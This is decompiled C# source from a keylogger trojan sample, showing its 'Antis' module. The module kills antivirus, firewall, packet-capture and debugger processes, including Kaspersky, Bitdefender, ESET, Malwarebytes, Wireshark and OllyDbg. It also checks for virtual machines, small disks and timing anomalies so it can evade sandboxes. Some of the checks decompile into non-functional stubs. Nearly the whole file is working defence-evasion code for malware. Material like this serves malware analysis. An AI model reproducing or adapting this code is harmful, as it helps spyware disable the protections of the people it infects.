// Decompiled with JetBrains decompiler
// Type: AHSJKHwyIUYUIYIYI8sOIioOID.Antis
// Assembly: Publicloggerversionztub, Version=2.0.0.2, Culture=neutral, PublicKeyToken=null
// MVID: 02BBAAFD-61B0-4722-9D55-257F48A7F005
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.ajb-34132edf41a9fe3359ebc67aedcf2dca594b4e5145bfa81e9a8b1d0fa57c1b2f.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace AHSJKHwyIUYUIYIYI8sOIioOID
{
  [StandardModule]
  internal sealed class Antis
  {
    public static void qwejJAUiewuoqo1u3oi12312()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "keyscrambler", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void SHOSHARKZ()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "wireshark", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void Shipost()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "outpost", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void Sheperskyz()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "avp", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void Shibender()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "bdagent", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void Shuwalarm()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "zlclient", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void wiIUQO1KLLAIowuEO2KOAA()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "Anubis.exe", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void Shunurmanizkabardiz()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "npfmsg.exe", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void nodrezspedtretodez()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "egui.exe", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void shuberbytizkeberdizdie()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "mbam.exe", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public static void shulabeldebiskeberidiz()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "ollydbg.exe", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    [DllImport("kernel32", EntryPoint = "GetDiskFreeSpaceExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetDiskFreeSpaceEx(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDirectoryName,
      ref long lpFreeBytesAvailableToMe,
      ref long lpTotalNumberOfBytes,
      ref long lpTotalNumberOfFreeBytes);

    public static bool vpzkabarzidikoborzi()
    {
      int num = Process.GetProcessesByName("vpcmap").Length >= 4 & Process.GetProcessesByName("vmsrvc").Length >= 4 ? 1 : 0;
      bool flag;
      return flag;
    }

    public static bool kuburdivimarekuburziger()
    {
      if (Process.GetProcessesByName("vmwareservice").Length < 1)
        ;
      bool flag;
      return flag;
    }

    public static bool vellokobarxzikobordi()
    {
      if (Process.GetProcessesByName("VBoxservice").Length < 1)
        ;
      bool flag;
      return flag;
    }

    public static bool shardabihardraviekorvadikemberdi()
    {
      string lpDirectoryName = "c:";
      long lpFreeBytesAvailableToMe;
      long lpTotalNumberOfBytes;
      long lpTotalNumberOfFreeBytes;
      Antis.GetDiskFreeSpaceEx(ref lpDirectoryName, ref lpFreeBytesAvailableToMe, ref lpTotalNumberOfBytes, ref lpTotalNumberOfFreeBytes);
      if (lpTotalNumberOfBytes < 20000000000L)
        ;
      bool flag;
      return flag;
    }

    public static bool Shumarnizkeabardizimulatorizkoborzi()
    {
      long tickCount = (long) Environment.TickCount;
      Thread.Sleep(500);
      if (checked ((long) Environment.TickCount - tickCount) >= 500L)
        ;
      bool flag;
      return flag;
    }
  }
}
